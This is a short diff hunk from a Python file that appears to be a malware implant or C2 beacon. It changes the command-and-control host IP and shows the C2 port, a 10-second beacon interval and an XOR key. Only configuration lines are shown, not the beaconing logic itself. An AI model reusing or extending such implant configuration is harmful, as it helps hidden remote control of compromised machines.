@@ -7,7 +7,7 @@ import sys
 import os
 
 # setup C2 connection details
-C2_HOST = '172.17.0.1'
+C2_HOST = '10.128.0.3'
 C2_PORT = 9999
 BEACON_INTERVAL = 10
 XOR_KEY = b'stonecap'
